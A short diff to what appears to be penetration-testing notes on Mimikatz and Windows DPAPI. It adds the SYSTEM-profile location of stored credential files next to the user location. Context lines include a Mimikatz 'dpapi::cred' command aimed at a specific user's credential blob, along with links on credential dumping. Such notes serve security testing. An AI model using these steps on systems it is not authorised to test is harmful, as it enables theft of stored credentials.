@@ -69,7 +69,8 @@ Donut
 Mimikatz DPAPI
 * https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
 * https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
-  Credential files are located at C:\Users\user\AppData\Local\Microsoft\Credentials\ (Vaults, etc..)
+  Credential files for SYSTEM: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials (Vaults, etc..)
+  Credential files for USERS: C:\Users\user\AppData\Local\Microsoft\Credentials\ (Vaults, etc..)
       Example: c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
   Get masterkey GUID
       mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
